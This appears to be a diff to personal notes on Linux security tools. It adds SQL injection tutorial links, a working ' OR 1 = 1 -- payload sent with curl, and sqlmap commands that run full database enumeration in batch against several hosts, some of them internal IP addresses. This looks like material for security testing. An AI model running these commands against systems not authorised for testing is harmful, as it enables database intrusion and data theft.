@@ -10,9 +10,19 @@ https://www.liquidweb.com/kb/lynis-a-security-auditing-tool-for-linux/
 https://opensource.com/article/20/8/linux-lynis-security
 https://cisofy.com/documentation/lynis/get-started/
 
-
+https://www.softwaretestinghelp.com/sql-injection-how-to-test-application-for-sql-injection-attacks/
+https://www.guru99.com/learn-sql-injection-with-practical-example.html
 wget https://github.com/sqlmapproject/sqlmap/zipball/master && unzip master && cd sqlinjast-master
 ./sqlmap.py -a --batch  -u http://foo.com/member?key= --dbms mysql
+
+
+curl http://127.0.0.1:5000/users?rank=%27%20OR%201%20=%201%20-- ###trigger /users?rank=' OR 1 = 1 -- 
+
+echo "
+http://10.0.1.6/member/datareportfollows?key=
+172.16.20.86:5000/users?rank=
+"|parallel -j 4 -k ./sqlmap.py -a --batch --dbms Mysql -u {} 2>&1 |tee -a sqlmap.log :::
+
 
 #root@host:~# lynis show commands
 
